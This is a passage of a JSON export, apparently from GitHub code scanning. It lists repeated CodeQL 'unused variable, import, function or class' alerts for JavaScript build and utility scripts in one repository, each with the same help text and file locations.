      "help": "# Unused variable, import, function or class\nUnused local variables make code hard to read and understand. Any computation used to initialize an unused variable is wasted, which may lead to performance problems.\n\nSimilarly, unused imports and unused functions or classes can be confusing. They may even be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this code, the function `f` initializes a local variable `x` with a call to the function `expensiveComputation`, but later on this variable is never read. Removing `x` would improve code quality and performance.\n\n\n```javascript\nfunction f() {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle case is shown below, where a function expression named `f` is assigned to a variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n};\nf();\n```\nNote that this example involves two distinct variables, both named `f`: the global variable to which the function is assigned, and the variable implicitly declared by the function expression. The call to `f()` refers to the former variable, whereas the latter is unused. Hence the example can be rewritten as follows, eliminating the useless variable:\n\n\n```javascript\nvar f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can occur with ECMAScript 2015 module exports, as shown in the following example:\n\n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\nAgain, the named function expression implicitly declares a variable `f`, but because the export statement is a default export, this variable is unused and can be eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\";\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n* Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n* Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Unused variable name." },
      "location": {
        "path": "scripts/mcp_supervisor.mjs",
        "start_line": 217,
        "end_line": 217,
        "start_column": 15,
        "end_column": 19
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/21/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 20,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/20",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/20",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/unused-local-variable",
      "severity": "note",
      "description": "Unused variable, import, function or class",
      "name": "js/unused-local-variable",
      "tags": ["maintainability", "quality", "useless-code"],
      "full_description": "Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.",
      "help": "# Unused variable, import, function or class\nUnused local variables make code hard to read and understand. Any computation used to initialize an unused variable is wasted, which may lead to performance problems.\n\nSimilarly, unused imports and unused functions or classes can be confusing. They may even be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this code, the function `f` initializes a local variable `x` with a call to the function `expensiveComputation`, but later on this variable is never read. Removing `x` would improve code quality and performance.\n\n\n```javascript\nfunction f() {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle case is shown below, where a function expression named `f` is assigned to a variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n};\nf();\n```\nNote that this example involves two distinct variables, both named `f`: the global variable to which the function is assigned, and the variable implicitly declared by the function expression. The call to `f()` refers to the former variable, whereas the latter is unused. Hence the example can be rewritten as follows, eliminating the useless variable:\n\n\n```javascript\nvar f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can occur with ECMAScript 2015 module exports, as shown in the following example:\n\n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\nAgain, the named function expression implicitly declares a variable `f`, but because the export statement is a default export, this variable is unused and can be eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\";\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n* Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n* Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Unused variable ENCODED_PREFIX." },
      "location": {
        "path": "scripts/validate_video.mjs",
        "start_line": 12,
        "end_line": 12,
        "start_column": 7,
        "end_column": 21
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/20/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 19,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/19",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/19",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/unused-local-variable",
      "severity": "note",
      "description": "Unused variable, import, function or class",
      "name": "js/unused-local-variable",
      "tags": ["maintainability", "quality", "useless-code"],
      "full_description": "Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.",
      "help": "# Unused variable, import, function or class\nUnused local variables make code hard to read and understand. Any computation used to initialize an unused variable is wasted, which may lead to performance problems.\n\nSimilarly, unused imports and unused functions or classes can be confusing. They may even be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this code, the function `f` initializes a local variable `x` with a call to the function `expensiveComputation`, but later on this variable is never read. Removing `x` would improve code quality and performance.\n\n\n```javascript\nfunction f() {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle case is shown below, where a function expression named `f` is assigned to a variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n};\nf();\n```\nNote that this example involves two distinct variables, both named `f`: the global variable to which the function is assigned, and the variable implicitly declared by the function expression. The call to `f()` refers to the former variable, whereas the latter is unused. Hence the example can be rewritten as follows, eliminating the useless variable:\n\n\n```javascript\nvar f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can occur with ECMAScript 2015 module exports, as shown in the following example:\n\n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\nAgain, the named function expression implicitly declares a variable `f`, but because the export statement is a default export, this variable is unused and can be eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\";\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n* Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n* Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Unused import url." },
      "location": {
        "path": "scripts/validate_video.mjs",
        "start_line": 6,
        "end_line": 6,
        "start_column": 1,
        "end_column": 28
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/19/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 18,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/18",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/18",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/unused-local-variable",
      "severity": "note",
      "description": "Unused variable, import, function or class",
      "name": "js/unused-local-variable",
      "tags": ["maintainability", "quality", "useless-code"],
      "full_description": "Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.",
      "help": "# Unused variable, import, function or class\nUnused local variables make code hard to read and understand. Any computation used to initialize an unused variable is wasted, which may lead to performance problems.\n\nSimilarly, unused imports and unused functions or classes can be confusing. They may even be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this code, the function `f` initializes a local variable `x` with a call to the function `expensiveComputation`, but later on this variable is never read. Removing `x` would improve code quality and performance.\n\n\n```javascript\nfunction f() {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle case is shown below, where a function expression named `f` is assigned to a variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n};\nf();\n```\nNote that this example involves two distinct variables, both named `f`: the global variable to which the function is assigned, and the variable implicitly declared by the function expression. The call to `f()` refers to the former variable, whereas the latter is unused. Hence the example can be rewritten as follows, eliminating the useless variable:\n\n\n```javascript\nvar f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can occur with ECMAScript 2015 module exports, as shown in the following example:\n\n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\nAgain, the named function expression implicitly declares a variable `f`, but because the export statement is a default export, this variable is unused and can be eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\";\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n* Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n* Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Unused import readFileSync." },
      "location": {
        "path": "scripts/sync_lighthouse.mjs",
        "start_line": 16,
        "end_line": 16,
        "start_column": 1,
        "end_column": 84
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/18/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 17,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/17",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/17",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/unused-local-variable",
      "severity": "note",
      "description": "Unused variable, import, function or class",
      "name": "js/unused-local-variable",
      "tags": ["maintainability", "quality", "useless-code"],
      "full_description": "Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.",
      "help": "# Unused variable, import, function or class\nUnused local variables make code hard to read and understand. Any computation used to initialize an unused variable is wasted, which may lead to performance problems.\n\nSimilarly, unused imports and unused functions or classes can be confusing. They may even be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this code, the function `f` initializes a local variable `x` with a call to the function `expensiveComputation`, but later on this variable is never read. Removing `x` would improve code quality and performance.\n\n\n```javascript\nfunction f() {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle case is shown below, where a function expression named `f` is assigned to a variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n};\nf();\n```\nNote that this example involves two distinct variables, both named `f`: the global variable to which the function is assigned, and the variable implicitly declared by the function expression. The call to `f()` refers to the former variable, whereas the latter is unused. Hence the example can be rewritten as follows, eliminating the useless variable:\n\n\n```javascript\nvar f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can occur with ECMAScript 2015 module exports, as shown in the following example:\n\n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\nAgain, the named function expression implicitly declares a variable `f`, but because the export statement is a default export, this variable is unused and can be eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\";\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n* Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n* Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Unused variable notion." },
      "location": {
        "path": "scripts/mcp_notion.mjs",
        "start_line": 7,
        "end_line": 7,
        "start_column": 7,
        "end_column": 13
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/17/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 16,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/16",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/16",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/unused-local-variable",
      "severity": "note",
      "description": "Unused variable, import, function or class",
      "name": "js/unused-local-variable",
      "tags": ["maintainability", "quality", "useless-code"],
      "full_description": "Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.",
      "help": "# Unused variable, import, function or class\nUnused local variables make code hard to read and understand. Any computation used to initialize an unused variable is wasted, which may lead to performance problems.\n\nSimilarly, unused imports and unused functions or classes can be confusing. They may even be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this code, the function `f` initializes a local variable `x` with a call to the function `expensiveComputation`, but later on this variable is never read. Removing `x` would improve code quality and performance.\n\n\n```javascript\nfunction f() {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle case is shown below, where a function expression named `f` is assigned to a variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n};\nf();\n```\nNote that this example involves two distinct variables, both named `f`: the global variable to which the function is assigned, and the variable implicitly declared by the function expression. The call to `f()` refers to the former variable, whereas the latter is unused. Hence the example can be rewritten as follows, eliminating the useless variable:\n\n\n```javascript\nvar f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can occur with ECMAScript 2015 module exports, as shown in the following example:\n\n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\nAgain, the named function expression implicitly declares a variable `f`, but because the export statement is a default export, this variable is unused and can be eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\";\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n* Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n* Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Unused function formatKb." },
      "location": {
        "path": "scripts/enforce_gating.mjs",
        "start_line": 316,
        "end_line": 316,
        "start_column": 10,
        "end_column": 18
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/16/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 15,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/15",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/15",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/unused-local-variable",
      "severity": "note",
      "description": "Unused variable, import, function or class",
      "name": "js/unused-local-variable",
      "tags": ["maintainability", "quality", "useless-code"],
      "full_description": "Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.",
      "help": "# Unused variable, import, function or class\nUnused local variables make code hard to read and understand. Any computation used to initialize an unused variable is wasted, which may lead to performance problems.\n\nSimilarly, unused imports and unused functions or classes can be confusing. They may even be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this code, the function `f` initializes a local variable `x` with a call to the function `expensiveComputation`, but later on this variable is never read. Removing `x` would improve code quality and performance.\n\n\n```javascript\nfunction f() {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle case is shown below, where a function expression named `f` is assigned to a variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n};\nf();\n```\nNote that this example involves two distinct variables, both named `f`: the global variable to which the function is assigned, and the variable implicitly declared by the function expression. The call to `f()` refers to the former variable, whereas the latter is unused. Hence the example can be rewritten as follows, eliminating the useless variable:\n\n\n```javascript\nvar f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can occur with ECMAScript 2015 module exports, as shown in the following example:\n\n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\nAgain, the named function expression implicitly declares a variable `f`, but because the export statement is a default export, this variable is unused and can be eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\";\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n* Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n* Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Unused import resolve." },
      "location": {
        "path": "scripts/lighthouse.mjs",
        "start_line": 4,
        "end_line": 4,
        "start_column": 1,
        "end_column": 37
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/15/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 14,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/14",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/14",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/unused-local-variable",
      "severity": "note",
      "description": "Unused variable, import, function or class",
      "name": "js/unused-local-variable",
      "tags": ["maintainability", "quality", "useless-code"],
      "full_description": "Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.",
      "help": "# Unused variable, import, function or class\nUnused local variables make code hard to read and understand. Any computation used to initialize an unused variable is wasted, which may lead to performance problems.\n\nSimilarly, unused imports and unused functions or classes can be confusing. They may even be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this code, the function `f` initializes a local variable `x` with a call to the function `expensiveComputation`, but later on this variable is never read. Removing `x` would improve code quality and performance.\n\n\n```javascript\nfunction f() {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle case is shown below, where a function expression named `f` is assigned to a variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n};\nf();\n```\nNote that this example involves two distinct variables, both named `f`: the global variable to which the function is assigned, and the variable implicitly declared by the function expression. The call to `f()` refers to the former variable, whereas the latter is unused. Hence the example can be rewritten as follows, eliminating the useless variable:\n\n\n```javascript\nvar f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can occur with ECMAScript 2015 module exports, as shown in the following example:\n\n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\nAgain, the named function expression implicitly declares a variable `f`, but because the export statement is a default export, this variable is unused and can be eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\";\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n* Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n* Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Unused import fileURLToPath." },
      "location": {
        "path": "scripts/lighthouse.mjs",
        "start_line": 3,
        "end_line": 3,
        "start_column": 1,
        "end_column": 42
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/14/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 13,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/13",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/13",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/unused-local-variable",
      "severity": "note",
      "description": "Unused variable, import, function or class",
      "name": "js/unused-local-variable",
      "tags": ["maintainability", "quality", "useless-code"],
      "full_description": "Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.",
      "help": "# Unused variable, import, function or class\nUnused local variables make code hard to read and understand. Any computation used to initialize an unused variable is wasted, which may lead to performance problems.\n\nSimilarly, unused imports and unused functions or classes can be confusing. They may even be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this code, the function `f` initializes a local variable `x` with a call to the function `expensiveComputation`, but later on this variable is never read. Removing `x` would improve code quality and performance.\n\n\n```javascript\nfunction f() {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle case is shown below, where a function expression named `f` is assigned to a variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n};\nf();\n```\nNote that this example involves two distinct variables, both named `f`: the global variable to which the function is assigned, and the variable implicitly declared by the function expression. The call to `f()` refers to the former variable, whereas the latter is unused. Hence the example can be rewritten as follows, eliminating the useless variable:\n\n\n```javascript\nvar f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can occur with ECMAScript 2015 module exports, as shown in the following example:\n\n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\nAgain, the named function expression implicitly declares a variable `f`, but because the export statement is a default export, this variable is unused and can be eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\";\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n* Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n* Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Unused import dirname." },
      "location": {
        "path": "scripts/lhci_snapshot.mjs",
        "start_line": 5,
        "end_line": 5,
        "start_column": 1,
        "end_column": 46
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/13/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 12,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/12",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/12",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/unused-local-variable",
      "severity": "note",
      "description": "Unused variable, import, function or class",
      "name": "js/unused-local-variable",
      "tags": ["maintainability", "quality", "useless-code"],
      "full_description": "Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.",
      "help": "# Unused variable, import, function or class\nUnused local variables make code hard to read and understand. Any computation used to initialize an unused variable is wasted, which may lead to performance problems.\n\nSimilarly, unused imports and unused functions or classes can be confusing. They may even be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this code, the function `f` initializes a local variable `x` with a call to the function `expensiveComputation`, but later on this variable is never read. Removing `x` would improve code quality and performance.\n\n\n```javascript\nfunction f() {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle case is shown below, where a function expression named `f` is assigned to a variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n};\nf();\n```\nNote that this example involves two distinct variables, both named `f`: the global variable to which the function is assigned, and the variable implicitly declared by the function expression. The call to `f()` refers to the former variable, whereas the latter is unused. Hence the example can be rewritten as follows, eliminating the useless variable:\n\n\n```javascript\nvar f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can occur with ECMAScript 2015 module exports, as shown in the following example:\n\n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\nAgain, the named function expression implicitly declares a variable `f`, but because the export statement is a default export, this variable is unused and can be eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\";\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n* Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n* Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Unused import fileURLToPath." },
      "location": {
        "path": "scripts/lhci_snapshot.mjs",
        "start_line": 4,
        "end_line": 4,
        "start_column": 1,
        "end_column": 42
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/12/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 11,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/11",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/11",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/unused-local-variable",
      "severity": "note",
      "description": "Unused variable, import, function or class",
      "name": "js/unused-local-variable",
      "tags": ["maintainability", "quality", "useless-code"],
